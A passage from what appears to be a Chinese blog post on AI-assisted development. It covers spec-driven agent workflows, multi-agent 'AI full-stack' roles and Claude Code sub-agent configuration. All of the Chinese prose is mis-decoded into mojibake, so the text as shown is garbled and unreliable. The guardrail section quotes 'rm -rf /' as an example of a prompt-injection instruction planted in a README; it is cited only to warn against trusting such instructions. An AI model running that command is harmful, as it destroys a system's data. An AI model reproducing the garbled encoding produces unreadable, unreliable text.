<li><strong>å¯¹è¯å¼</strong>ï¼šåœ¨ IDE ä¾§è¾¹æ æˆ–ç½‘é¡µä¸­ï¼Œé€šè¿‡è‡ªç„¶è¯­è¨€é—®ç­”æ¥ç”Ÿæˆä»£ç ã€è§£é‡Šä»£ç æˆ–æŸ¥æ‰¾ Bugã€‚å¦‚ï¼š"å¸®æˆ‘å†™ä¸€ä¸ª Python çš„æ­£åˆ™æ¥éªŒè¯é‚®ç®±" æˆ– "è¿™æ®µä»£ç ä¸ºä»€ä¹ˆæŠ¥é”™ï¼Ÿ"</li>
</ul>
<p>è¿™ä¸€å±‚çš„å±€é™ï¼š</p>
<ul>
<li><strong>ä¸Šä¸‹æ–‡æœ‰é™</strong>ï¼šAI é€šå¸¸åªèƒ½çœ‹åˆ°å½“å‰æ–‡ä»¶æˆ–å°‘é‡ç›¸å…³ç‰‡æ®µï¼Œç¼ºä¹å¯¹æ•´ä¸ªé¡¹ç›®æ¶æ„çš„ç†è§£ã€‚</li>
<li><strong>è¢«åŠ¨æ€§</strong>ï¼šAI ä¸ä¼šä¸»åŠ¨ä¿®æ”¹ä½ çš„ä»£ç æ–‡ä»¶ï¼Œå®ƒç”Ÿæˆä»£ç ï¼Œä½ è´Ÿè´£å¤åˆ¶ç²˜è´´å’Œæ ¡éªŒã€‚</li>
<li><strong>äººæ˜¯ç“¶é¢ˆ</strong>ï¼šæ‰€æœ‰çš„å†³ç­–ã€æ–‡ä»¶åˆ‡æ¢ã€ç¯å¢ƒé…ç½®éƒ½å¿…é¡»ç”±äººæ¥æ“ä½œã€‚</li>
</ul>
<h3 data-id="heading-36">6.3. ç¬¬äºŒå±‚ï¼šAI é©±åŠ¨å¼€å‘æµç¨‹ (è§„èŒƒ+Agent)</h3>
<p>ç›®å‰æœ€å‰æ²¿ã€æœ€çƒ­é—¨çš„é˜¶æ®µï¼ŒAI ä¸å†åªæ˜¯åå‡ºä»£ç ç‰‡æ®µï¼Œè€Œæ˜¯è¿›åŒ–ä¸º <strong>Agent</strong> (æ™ºèƒ½ä½“)ï¼Œæ‹¥æœ‰äº† "<strong>å¤§è„‘</strong>" (è§„åˆ’èƒ½åŠ›) å’Œ "<strong>æ‰‹è„š</strong>" (å·¥å…·ä½¿ç”¨èƒ½åŠ›)ï¼Œå¯ä»¥ "<strong>è‡ªä¸»å®Œæˆä¸€ä¸ªå¤šæ­¥éª¤çš„å¼€å‘ä»»åŠ¡</strong>"ã€‚</p>
<p>å˜æˆäº†ã€Œ<strong>äººå®šç›®æ ‡ + Agent è‡ªä¸»æ‰§è¡Œ</strong>ã€ï¼Œå¦‚ï¼š"å®ç°ä¸€ä¸ªç®€å•çš„å¾…åŠäº‹é¡¹ Web æœåŠ¡ï¼Œè¦æ±‚ï¼šREST APIï¼Œå†…å­˜å­˜å‚¨å³å¯ï¼Œæœ‰å•å…ƒæµ‹è¯•"ï¼ŒAgent å¯èƒ½ä¼šè¿›è¡Œè¿™æ ·çš„ä»»åŠ¡æ‹†è§£å¹¶æ‰§è¡Œï¼š</p>
<p>è®¾è®¡ç›®å½•ç»“æ„ â†’ åˆ›å»ºä»£ç æ–‡ä»¶ â†’ å†™ä¸šåŠ¡é€»è¾‘ â†’ å†™æµ‹è¯• â†’ è¿è¡Œæµ‹è¯•å¹¶è‡ªæˆ‘ä¿®å¤ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e204f87aa13540029ab80c53f800389e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=yQ1i4mkApZf7ZfuJXuxnyNgka6o%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b93dad5b3124defb7284621e2e8f5ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=Mwc%2FArpLGoVjCZ9Ep%2FWtE3aPYLk%3D" alt="" loading="lazy"/></p>
<p>ä¸ºäº†ç³»ç»Ÿåœ°åº”ç”¨ <strong>Agent</strong>ï¼Œä¸šç•Œé€æ¸é‡‡ç”¨ã€Œ <strong>"è§„èŒƒ"é©±åŠ¨çš„å¼€å‘æµç¨‹</strong>ã€(Spec-Driven Development)ï¼š</p>
<p><strong>éœ€æ±‚</strong> â†’ <strong>è§„èŒƒæ–‡æ¡£</strong> â†’ <strong>ä»»åŠ¡åˆ†è§£</strong> â†’ <strong>Agentæ‰§è¡Œ</strong> â†’ <strong>éªŒè¯åé¦ˆ</strong></p>
<p>è¿™ä¸ªæµç¨‹ç¡®ä¿äº† <strong>æ¸…æ™°çš„ç›®æ ‡å®šä¹‰</strong> å’Œ <strong>å¯è¿½è¸ªçš„æ‰§è¡Œè¿‡ç¨‹</strong>ï¼Œè€Œä¸æ˜¯è®©Agentç›²ç›®æ“ä½œã€‚å¼€å‘è€…éœ€è¦ç»´æŠ¤çš„ "<strong>ä¸‰ç±»è§„èŒƒ</strong>" (è§„èŒƒå¿…é¡»æ¯”å†™ä»£ç æ›´æ¸…æ™°)ï¼š</p>
<ul>
<li><strong>åŠŸèƒ½è§„èŒƒ</strong>ï¼šç›®æ ‡ã€ç”¨æˆ·æ•…äº‹ã€è¾“å…¥è¾“å‡ºã€æ€§èƒ½è¦æ±‚ã€é‰´æƒã€è¾¹ç•Œæƒ…å†µç­‰ã€‚</li>
<li><strong>æŠ€æœ¯è§„èŒƒ</strong>ï¼šæ¨¡å—ç»“æ„ã€APIã€æ¨¡å‹å­—æ®µã€çŠ¶æ€æœºã€å¼‚å¸¸æµç¨‹ç­‰ï¼ŒAgentä¼šæ ¹æ®è¿™äº›è‡ªåŠ¨åˆ›å»ºé¡¹ç›®ã€‚</li>
<li><strong>éªŒæ”¶è§„èŒƒ</strong>ï¼šæµ‹è¯•é€šè¿‡ã€æ¥å£è¿”å›æ­£ç¡®ã€æ€§èƒ½æ»¡è¶³è¦æ±‚ã€è¡Œä¸ºä¸è®¾è®¡ä¸€è‡´ï¼Œå³æ¯ä¸ªåŠŸèƒ½çš„è¯„ä»·æ–¹å¼ã€‚</li>
</ul>
<p><strong>äººä¸å†å†™ä»£ç </strong> (æˆ–è€…å°‘å†™)ï¼Œè´Ÿè´£ã€Œ<strong>å®šä¹‰ + å®¡æ ¸ + æˆæƒ</strong>ã€ï¼Œ<strong>äºº-Agent åä½œ</strong> çš„ä¸‰é˜¶æ®µå¾ªç¯ï¼š</p>
<ul>
<li><strong>äººä¸»å¯¼-ç›®æ ‡è®¾å®š</strong>ï¼šèŒƒå›´ã€çº¦æŸã€è¾¹ç•Œã€ä¸å…è®¸åšçš„äº‹æƒ…ã€‚</li>
<li><strong>Agentä¸»å¯¼-æ‰§è¡Œ</strong>ï¼šåˆ†è§£ã€è§„åˆ’ã€å†™ä»£ç ã€è‡ªåŠ¨Debugã€ä¿®å¤ã€ç”ŸæˆæŠ¥å‘Šã€‚</li>
<li><strong>äººä¸»å¯¼-éªŒæ”¶</strong>ï¼šä»£ç è´¨é‡ã€å®‰å…¨æ€§ã€å•å…ƒæµ‹è¯•è¦†ç›–ç‡ã€åå·®æ˜¯å¦æ»¡è¶³ä¸šåŠ¡éœ€æ±‚ç­‰ã€‚</li>
</ul>
<p>ğŸ’¡ å±‚2 å…³æ³¨çš„æ˜¯ã€Œ<strong>å¼€å‘æµç¨‹è‡ªåŠ¨åŒ–</strong>ã€ï¼Œä»»åŠ¡çš„èµ·ç‚¹é€šå¸¸æ˜¯ "<strong>å·²ç»ç¡®å®šå¥½çš„éœ€æ±‚/feature</strong>"ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2580004a95a54f7390babed2842a4151~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=vcf5XTtggMvqTvHvKy%2BqwXmbHEs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-37">6.4. ç¬¬ä¸‰å±‚ï¼šAI å…¨æ ˆ</h3>
<p>æ‰€è°“çš„ "<strong>AI å…¨æ ˆ</strong>"ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ "<strong>è®© AI åŒæ—¶æ‰®æ¼”å¤šä¸ªè½¯ä»¶å¼€å‘è§’è‰²</strong>"ï¼Œè€Œ "<strong>ä¸€äººåˆ†é¥°å¤šè§’</strong>" çš„è‡ªç„¶å®ç°æ–¹å¼å°±æ˜¯ "<strong>å¤š Agents</strong>"ã€‚â€”â€”ã€Š<strong>æŠ è…šç”·å­©</strong>ã€‹</p>
<h4 data-id="heading-38">6.4.1. ä¸ºä»€ä¹ˆèŠåˆ° "AIå…¨æ ˆ" å°±ä¼šæ‰¯åˆ°"å¤š Agents"?</h4>
<p>ğŸ¤” æƒ³è±¡ä¸€ä¸‹è®© "<strong>AIå…¨æ ˆå¼€å‘ä¸€ä¸ªåº”ç”¨</strong>" éœ€è¦ç»å†å“ªäº›æ­¥éª¤ï¼Ÿ</p>
<p><strong>äº§å“éœ€æ±‚ç†è§£</strong> â†’ <strong>æŠ€æœ¯é€‰å‹</strong> â†’ <strong>æ¶æ„è®¾è®¡</strong> â†’ <strong>API è®¾è®¡</strong> â†’ <strong>å‰åç«¯ä»£ç ç”Ÿæˆ</strong> â†’ <strong>æ•°æ®åº“ schema</strong> â†’ <strong>é”™è¯¯å¤„ç†</strong> â†’ <strong>æ–‡æ¡£ç”Ÿæˆ</strong> â†’ <strong>å•æµ‹ç¼–å†™</strong> â†’ <strong>æµ‹è¯•æ‰§è¡Œ</strong> â†’ <strong>éƒ¨ç½²è„šæœ¬</strong> â†’ <strong>CI/CD é…ç½®</strong>ã€‚</p>
<p>è®©ä¸€ä¸ª <strong>Agent</strong> æ‰¿åŒ…ä¸Šé¢æ‰€æœ‰çš„å·¥ä½œï¼Œä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ</p>
<p>è®°å¿†é‡çˆ†ç‚¸ã€ç›®æ ‡åˆ‡æ¢é¢‘ç¹ã€æ¨ç†é“¾æ‹‰å¾—å¤ªé•¿ï¼Œé”™è¯¯ç§¯ç´¯å˜å¤§ã€ä¸€æ—¦ä¸€æ­¥å‡ºé”™ï¼Œåç»­å…¨å´©ã€é£æ ¼ã€ç»“æ„ã€ä»£ç è´¨é‡éš¾ç»Ÿä¸€ã€éš¾ä»¥å¹¶è¡Œã€‚</p>
<p>è½¯ä»¶å·¥ç¨‹æ˜¯ "<strong>å¤šè§’è‰²åä½œ</strong>" çš„ç»“æœï¼šäº§å“ç»ç†ã€æ¶æ„å¸ˆã€åç«¯ã€å‰ç«¯ã€æµ‹è¯•ã€æ–‡æ¡£ã€DevOps... å¦‚æœæƒ³ "AI <strong>æ¨¡æ‹Ÿå®Œæ•´çš„è½¯ä»¶å¼€å‘æµç¨‹</strong>"ï¼Œè‡ªç„¶ä¹Ÿéœ€è¦ "<strong>è®© AI ä¹Ÿæ¨¡æ‹Ÿè¿™äº›è§’è‰²</strong>"ï¼Œäºæ˜¯å°±å˜æˆäº†è¿™äº› <strong>Agent</strong>ï¼š</p>
<ul>
<li><strong>Planner / Architect</strong> (äº§å“/æ¶æ„)ï¼šç†è§£éœ€æ±‚ã€æ‹†ä»»åŠ¡ã€å‡ºè®¡åˆ’ (Plan)ã€‚</li>
<li><strong>Coder / Implementer</strong> (å®ç°)ï¼šæŒ‰è®¡åˆ’æ”¹ä»£ç ã€å¢åˆ æ–‡ä»¶ã€‚</li>
<li><strong>Searcher / Context Agent</strong> (æ£€ç´¢)ï¼šåœ¨ä»£ç åº“é‡Œæ‰¾ç›¸å…³æ–‡ä»¶ã€APIã€è°ƒç”¨é“¾ã€‚</li>
<li><strong>Tester / QA</strong> (å†™æµ‹ / è·‘æµ‹)ï¼šå†™æµ‹è¯•ã€è·‘æµ‹è¯•ã€åˆ†ææŠ¥é”™ã€‚</li>
<li><strong>Fixer / Debug Agent</strong> (ä¿®BUG)ï¼šæ ¹æ®æµ‹è¯•/è¿è¡Œç»“æœä¿®å¤ä»£ç ã€‚</li>
<li><strong>Reviewer / Critic Agent</strong> (ä»£ç å®¡é˜…)ï¼šæ£€æŸ¥é£æ ¼ã€ä¸€è‡´æ€§ã€æ½œåœ¨ bug / å®‰å…¨é—®é¢˜</li>
<li><strong>Ops / Deploy Agent</strong> (éƒ¨ç½²)ï¼šå†™ Dockerã€CI/CDã€éƒ¨ç½²è„šæœ¬ï¼ˆæœ‰äº›ç³»ç»Ÿåªåšåˆ°ç”Ÿæˆï¼Œä¸è‡ªåŠ¨æ‰§è¡Œï¼‰</li>
</ul>
<p>å³ã€Œ<strong>AI å…¨æ ˆ = AI è½¯ä»¶å¼€å‘æµæ°´çº¿ = æ¨¡æ‹Ÿæ•´ä¸ªè½¯ä»¶éƒ¨é—¨ = å¤š Agent ç³»ç»Ÿ</strong>ã€ï¼Œè¿™æ˜¯å¼€å‘ä»»åŠ¡å†³å®šçš„ã€‚</p>
<p><strong>"AIå…¨æ ˆ"</strong> éœ€è¦çš„ä¸‰å¤§æ ¸å¿ƒèƒ½åŠ›ï¼š</p>
<ul>
<li><strong>é•¿ä»»åŠ¡è§„åˆ’</strong> (Planning)ï¼šå¼€å‘ä¸€ä¸ªç³»ç»Ÿä¸æ˜¯çº¿æ€§çš„ï¼Œæ˜¯æ ‘çŠ¶å†³ç­–ç»“æ„ï¼Œè¦æ‹†åˆ†ä»»åŠ¡ï¼Œå°±éœ€è¦ Planner Agentã€‚</li>
<li><strong>å¹¶è¡Œæ‰§è¡Œ</strong> (Parallel Execution)ï¼šå‰ç«¯ã€åç«¯ã€æ–‡æ¡£ã€æµ‹è¯•ä¸å¯èƒ½ä¸€ä¸ªä¸ªçº¿æ€§åšã€‚å¤š Agent å¯ä»¥ï¼šå‰ç«¯ Agent æ”¹ UIã€åç«¯ Agent å†™ APIã€Docs Agent è¡¥æ–‡æ¡£ã€Test Agent è¡¥æµ‹è¯•ã€‚</li>
<li><strong>éªŒè¯ &amp; ä¿®å¤</strong> (Validation Loop)ï¼šçœŸæ­£è®© "AI å…¨æ ˆ" å¯è¡Œçš„å…³é”®æ˜¯ "<strong>å¾ªç¯</strong>"ï¼Œå†™ä»£ç ã€è·‘æµ‹è¯•ã€æ‰¾é”™è¯¯ã€ä¿®å¤ã€å†è·‘ï¼Œéœ€è¦ "<strong>å¤š Agent + çŠ¶æ€æœº</strong>" æ‰èƒ½æ’‘èµ·è¿™ä¸ªèƒ½åŠ›ã€‚</li>
</ul>
<p>"<strong>AI å…¨æ ˆç³»ç»Ÿ</strong>" çš„å®ç°ï¼Œæœ¬è´¨å°±è¿™å››æ­¥ï¼š</p>
<ul>
<li><strong>ã€Œå®šä¹‰ä¸€å †ä¸Šé¢è¿™æ ·çš„è§’è‰²ã€</strong></li>
<li>ã€Œ<strong>æ’å¸ƒæ‹“æ‰‘</strong>ã€å†³å®šè¿™äº›è§’è‰²ä¹‹é—´çš„è¿æ¥ç»“æ„å’Œè°ƒç”¨å…³ç³»ã€‚<strong>è°å…ˆè°å</strong> (æ‹“æ‰‘/é¡ºåº)ã€<strong>æœ‰æ²¡æœ‰å¾ªç¯</strong> (å†™â†’æµ‹â†’ä¿®â†’å†æµ‹)ã€<strong>æœ‰å¹¶è¡Œå—</strong> (å‰åç«¯AgentåŒæ—¶å¹²æ´»ï¼Ÿ)ã€<strong>æ˜¯ç”±ä¸€ä¸ª "ä¸»ç®¡Agent" æŒ‡æŒ¥å¤§å®¶ï¼Ÿè¿˜æ˜¯å¤§å®¶æŒ‰ç…§çŠ¶æ€æœºè‡ªå·±è½¬ï¼Ÿ</strong></li>
<li>ã€Œ<strong>ç»™æ¯ä¸ªè§’è‰²æ¥ä¸Šèƒ½ç”¨çš„"å·¥å…·"ï¼Œè®©å®ƒçœŸçš„èƒ½åŠ¨æ‰‹å¹²æ´»</strong>ã€å¸¸è§å·¥å…·ï¼š<strong>æ–‡ä»¶</strong> (è¯»/å†™ä»£ç ã€ç”Ÿæˆ diff)ã€<strong>ç»ˆç«¯</strong> (æ‰§è¡Œå‘½ä»¤)ã€<strong>æœç´¢</strong> (åœ¨ repo é‡Œæœç¬¦å· / ç”¨æ³•)ã€<strong>HTTP/Browser</strong> (æŸ¥æ–‡æ¡£ã€æŸ¥API)ã€<strong>Git</strong> (å¼€åˆ†æ”¯ã€commitã€ç”ŸæˆPR)ã€<strong>ç»“æ„åŒ–åˆ†æ</strong> (ASTåˆ†æã€è°ƒç”¨å›¾ã€ä¾èµ–å›¾)ã€‚æ¯”å¦‚ï¼šCoder Agent é…ç½® "æ–‡ä»¶è¯»å†™ã€diff ç”Ÿæˆã€ä»£ç æœç´¢" çš„å·¥å…·ï¼Œç”¨æ¥ "åœ¨å—æ§èŒƒå›´å†…æ”¹ä»£ç "ã€‚</li>
<li>ã€Œ<strong>å¥—ä¸€å±‚å®‰å…¨è¾¹ç•Œ</strong>ã€<strong>æƒé™</strong> (è¯»å†™ã€åªèƒ½æ”¹æŒ‡å®šç›®å½•ã€ç»ˆç«¯å‘½ä»¤å¿…é¡»åœ¨æ²™ç®±é‡Œæ‰§è¡Œ)ã€<strong>äººåœ¨å›ç¯</strong> (å…³é”®æ“ä½œå¿…é¡»äººå·¥ç¡®è®¤ï¼Œå¦‚ï¼šPlan-ä»»åŠ¡è§„åˆ’ã€å¤§èŒƒå›´diffã€éƒ¨ç½²ç›¸å…³æ”¹åŠ¨/é«˜å±è„šæœ¬)ã€<strong>é˜²æ³¨å…¥/è¯¯æ“ä½œ</strong> (ä¸è½»ä¿¡ä»£ç åº“é‡Œçš„"æŒ‡ä»¤"-å¦‚ï¼šæ¶æ„README å†™ "rm -rf /"ã€å¯¹å¤–éƒ¨è¾“å…¥åšè¿‡æ»¤-æ—¥å¿—/é”™è¯¯ä¿¡æ¯/ç”¨æˆ·Promptã€é™åˆ¶é‡è¯•æ¬¡æ•°ï¼Œé¿å…æ­»å¾ªç¯ä¿®æ”¹)ã€‚</li>
</ul>
<p>ä¸€å¥è¯æ¦‚æ‹¬å°±æ˜¯ï¼š</p>
<p><strong>AI å…¨æ ˆ = ä¸€ç¾¤å°æ¨¡å‹/å°è§’è‰² + ä¸€ä¸ªè°ƒåº¦å…³ç³»å›¾ + ä¸€å †å·¥å…·å‡½æ•° + ä¸€åœˆå®‰å…¨æŠ¤æ </strong></p>
<p>ğŸ˜„ å¼„æ¸…æ¥šæœ¬è´¨ï¼Œä»¥åçœ‹ä»»ä½• "<strong>AI å…¨æ ˆå¤š Agents</strong>" æ–¹æ¡ˆï¼Œéƒ½å¯ä»¥åŸºäºè¿™ä¸‰ä¸ªé—®é¢˜è¿›è¡Œå¿«é€Ÿæ‹†è§£ï¼š</p>
<ul>
<li>å®ƒæœ‰å“ªäº›è§’è‰²ï¼Ÿ(<strong>Planner / Coder / Tester / Fixer / Opsâ€¦</strong>)</li>
<li>è¿™äº›è§’è‰²æ˜¯æŒ‰ä»€ä¹ˆæ‹“æ‰‘ / æµç¨‹è¿èµ·æ¥çš„ï¼Ÿ</li>
<li>æ¯ä¸ª Agent æœ‰å“ªäº›å·¥å…·ï¼Ÿå®‰å…¨è¾¹ç•Œæ˜¯ä»€ä¹ˆï¼Ÿ</li>
</ul>
<h4 data-id="heading-39">6.4.2. ä¸šç•Œä¸»æµå¤š Agent æ¶æ„æ¨¡å¼</h4>
<p>å‰é¢AIå¸¸è¯†éƒ¨åˆ†æœ‰æåˆ°è¿‡ï¼Œè¿™é‡Œç›´æ¥è®©ğŸŒç”»ä¸ªå›¾~</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb7a939eecc542369a0e48132b435b13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=hGbZdewlj9%2FF7S9CTmtLrfZFr9o%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-40">6.4.3. ä¸ªäººçº§ "AIå…¨æ ˆ" æ¼”è¿›å†ç¨‹</h4>
<p>ğŸ¤¡ ä¸Šé¢çš„ç†è®ºçœ‹èµ·æ¥ç®€å•ï¼Œä½†å¯¹äºä¸ªäººæ¥è¯´ï¼Œæƒ³è¦äº²æ‰‹å®ç°è¿™æ · <strong>ä¸€æ•´å¥—å¤š Agents AI å…¨æ ˆç³»ç»Ÿ</strong>ï¼Œå·¥ä½œé‡çˆ†ç‚¸ï¼š</p>
<p>å¾—è‡ªå·±å†™è°ƒåº¦ã€ç®¡çŠ¶æ€ã€æ¥å·¥å…·ã€æ§å®‰å…¨ã€åšå¯è§†åŒ–ï¼Œè¿˜è¦ç»´æŠ¤ä¸€å † prompt å’Œé…ç½®ï¼Œç®—å®Œæ•´å¹³å°å·¥ç¨‹äº†...</p>
<p>ğŸ¤” ç¬”è€…è®¤ä¸º "<strong>ä¸ªäººçº§AIå…¨æ ˆ</strong>" æ›´å€¾å‘äºï¼š</p>
<p>åœ¨ä¸ªäººå¯ä»¥æ‰¿å—çš„å¤æ‚åº¦å’Œæ—¶é—´æˆæœ¬å†…ï¼Œ<strong>è®©AIå‚ä¸å°½å¯èƒ½å¤šçš„å¼€å‘ç¯èŠ‚</strong>ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ€§é€ ä¸€ä¸ªä¼ä¸šçº§AIå·¥å‚ã€‚</p>
<p>ğŸ˜„ å…¶å®ï¼Œä½ å¯èƒ½å·²ç»åœ¨æ— å½¢ä¸­ä½“éªŒ "<strong>AI å…¨æ ˆ</strong>" çš„é›å½¢äº†ï¼Œç°ä»£ <strong>AI ç¼–ç¨‹å·¥å…·</strong> æœ¬èº«å°±å†…ç½®äº† <strong>å¤š Agent</strong> ç¼–æ’èƒ½åŠ›~</p>
<p>â‘  <strong>Claude Code Sub Agents</strong></p>
<p><strong>CC</strong> ä¸­å…è®¸åˆ›å»ºå¤šä¸ªå¸¦ <strong>ç‹¬ç«‹è§’è‰²ä¸ä¸Šä¸‹æ–‡</strong> çš„ <strong>Sub Agent</strong> (å°å‹ä¸“å±AIå·¥ä½œè€…)ï¼Œç”¨æ³•ç®€å•ï¼š</p>
<ol>
<li><strong>åˆ›å»º Sub Agent</strong></li>
</ol>
<ul>
<li>åœ¨ <strong>Claude Code CLI</strong> è¾“å…¥ <strong>/agents</strong>ï¼Œé€‰æ‹©ã€Œ<strong>Create new agent</strong>ã€</li>
<li><strong>é€‰æ‹©ä½œç”¨åŸŸ</strong>ï¼šé¡¹ç›®çº§ (æ¨èï¼Œåªç»™å½“å‰é¡¹ç›®ä½¿ç”¨)ã€ç”¨æˆ·çº§ (æ‰€æœ‰é¡¹ç›®å¯ç”¨)</li>
<li>å¡«å†™ï¼šname (è°ƒç”¨çš„æ—¶å€™ç”¨åˆ°)ã€description (å†³å®šCCä½•æ—¶è‡ªåŠ¨è°ƒå®ƒ)</li>
<li>é€‰æ‹©å¯ç”¨å·¥å…· (file_edit / bash / file_search / git â€¦)</li>
<li>å®Œå–„ç³»ç»ŸPromptï¼šå¯ä»¥å…ˆè®© Claude ç”Ÿæˆï¼Œå†è‡ªå·±æ”¹</li>
</ul>
<p>ä¿å­˜åï¼Œä¼šåœ¨ <strong>.claude/agents/</strong> ç”Ÿæˆä¸€ä¸ªç±»ä¼¼è¿™æ ·çš„æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">---
name: backend-dev
description: "ä¸“é—¨è´Ÿè´£åç«¯æ¥å£ã€æœåŠ¡é€»è¾‘å’Œæ•°æ®åº“ç›¸å…³ä»£ç çš„å®ç°ä¸ä¿®æ”¹"
model: sonnet
tools: [file<span class="hljs-emphasis">_search, file_</span>edit]
<span class="hljs-section">color: blue
---</span>

ä½ æ˜¯ä¸€ä¸ªèµ„æ·±åç«¯å·¥ç¨‹å¸ˆï¼Œç²¾é€š Node.js + TypeScript å’Œè¿™ä¸ªé¡¹ç›®çš„åç«¯æ¶æ„ã€‚
ä½ çš„èŒè´£ï¼š
<span class="hljs-bullet">-</span> åªæ”¹åç«¯ç›¸å…³çš„ä»£ç ï¼ˆcontrollers, services, repositoriesï¼‰
<span class="hljs-bullet">-</span> éµå¾ªé¡¹ç›®ç°æœ‰çš„ä»£ç é£æ ¼å’Œç»“æ„
<span class="hljs-bullet">-</span> æ‰€æœ‰æ”¹åŠ¨éƒ½è¦å°½é‡å°æ­¥ã€å®‰å…¨ã€å¯è¯»
åœ¨ç»™å‡ºä¿®æ”¹æ—¶ï¼š
<span class="hljs-bullet">-</span> æ ‡æ˜æ–‡ä»¶è·¯å¾„
<span class="hljs-bullet">-</span> ç”¨ patch çš„é£æ ¼å±•ç¤ºä¿®æ”¹
<span class="hljs-bullet">-</span> å¦‚æœéœ€è¦æ–°å¢æ–‡ä»¶ï¼Œè¦è¯´æ˜ç”¨é€”å’Œå¼•ç”¨å…³ç³»
</code></pre>
<p>ä¸æƒ³è‡ªåŠ¨ç”Ÿæˆï¼Œå¯ä»¥åœ¨ <strong>.claude/agents/</strong> æ‰‹åŠ¨æŒ‰ç…§ä¸Šé¢çš„æ ¼å¼è‡ªå·±å†™mdï¼Œä¿å­˜å CC ä¼šè‡ªåŠ¨è¯†åˆ«ã€‚è¿˜å¯ä»¥åœ¨å‘½ä»¤è¡Œå¯åŠ¨CCæ—¶æ·»åŠ  <strong>--agents å‚æ•°</strong> (é€‚ç”¨äºä¸´æ—¶æŒ‚è½½åœºæ™¯)ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">claude --agents <span class="hljs-string">'{
  "log-analyzer": {
    "description": "åˆ†ææµ‹è¯•æ—¥å¿—å’Œé”™è¯¯å †æ ˆçš„ä¸“ç”¨Agent",
    "system_prompt": "ä½ åªè´Ÿè´£é˜…è¯»æµ‹è¯•è¾“å‡ºã€æ—¥å¿—ï¼Œå¸®åŠ©å®šä½é—®é¢˜å’Œæ€€ç–‘æ–‡ä»¶ï¼Œä¸å†™ä»£ç ",
    "tools": ["file_search"]
  }
}'</span>
</code></pre>
<ol start="2">
<li><strong>è°ƒç”¨ Sub Agent</strong> (ä¸²èµ·æ¥) çš„ä¸‰ç§æ–¹å¼</li>
</ol>
<ul>
<li>â‘  <strong>è‡ªç„¶è¯­è¨€ç¼–æ’</strong>ï¼Œç”¨æ™®é€šæŒ‡ä»¤æè¿°ä»»åŠ¡ï¼Œç”± Claude è‡ªåŠ¨åˆ¤æ–­å¹¶è°ƒç”¨åˆé€‚çš„ Sub Agentï¼Œæœ€çµæ´»ã€æœ€è´´è¿‘è‡ªç„¶å¯¹è¯çš„æ–¹å¼ã€‚å¦‚ï¼šè¯·ç”¨ backend-dev subagent ä¿®æ”¹ search controller çš„åˆ†é¡µé€»è¾‘ã€‚</li>
<li>â‘¡ <strong>ç»“æ„åŒ–ç‚¹åè°ƒç”¨</strong>ï¼Œæ˜ç¡®æŒ‡å®šè¦è°ƒç”¨å“ªä¸ª Sub Agentï¼Œé€‚åˆéœ€è¦ç²¾ç¡®æ§åˆ¶æ‰§è¡Œé¡ºåºæˆ–é¿å…æ¨¡å‹è¯¯åˆ¤çš„æƒ…å†µã€‚å¦‚ï¼šUse the <code>test-runner</code> subagent to run the unit tests.</li>
<li>â‘¢ åœ¨ <strong>Agentrooms</strong> ä¸­ä½¿ç”¨ <strong>@agent-name</strong> ç›´æ¥ç‚¹åï¼Œé€šè¿‡@ç”¨æˆ·çš„æ–¹å¼æ´¾ä»»åŠ¡ï¼Œå¯åŒæ—¶ç®¡ç†å¤šä¸ª Agentï¼Œæ–¹ä¾¿å¤šäººè§†å›¾å’Œå¤š Agent åä½œã€‚å¦‚ï¼š@backend-dev å¸®æˆ‘è°ƒæ•´è¿™ä¸ªæ¥å£çš„è¿”å›æ ¼å¼</li>
</ul>
<ol start="3">
<li>å¤šä¸ª Sub Agents ååŒå·¥ä½œç®€å•ç¤ºä¾‹ (å¼€å‘ â†’ æµ‹è¯• â†’ åˆ†æ â†’ å†å¼€å‘)ï¼š</li>
</ol>
<ul>
<li>è®© developer ç”Ÿæˆè¡¥ä¸</li>
<li>è®© test-runner è¿è¡Œæµ‹è¯•</li>
<li>è®© log-analyst åˆ†æå¤±è´¥åŸå› </li>
<li>å†è®© developer æ ¹æ®åˆ†æä¿®å¤</li>
<li>Claude ä¼šè‡ªåŠ¨æ¥åŠ›ï¼Œä¹Ÿå¯ä»¥ç”±ä½ æ‰‹åŠ¨ç¼–æ’~</li>
</ul>
<p>â‘¡ <strong>Cursor 2.0 å¤š Agent ç¼–æ’</strong></p>
<p>2.0 åï¼Œ<strong>Cursor</strong> ç•Œé¢ä» "<strong>ä»¥æ–‡ä»¶ä¸ºä¸­å¿ƒ</strong>" å˜æˆ "<strong>ä»¥Agentä¸ºä¸­å¿ƒ</strong>"ï¼Œå¤šäº†ä¸ª <strong>Agent Layout</strong>ï¼Œåˆ‡æ¢åï¼Œä¾§è¾¹æ ä¼šæ˜¾ç¤ºå½“å‰ Agentã€è®¡åˆ’ï¼ˆplanï¼‰å’Œæ”¹åŠ¨ï¼Œä½ æŠŠéœ€æ±‚ä¸¢è¿›å»ï¼ŒAgent è´Ÿè´£è¯»æ–‡ä»¶ã€è®¡åˆ’ã€æ”¹ä»£ç ã€è·‘æµ‹è¯•ã€‚</p>
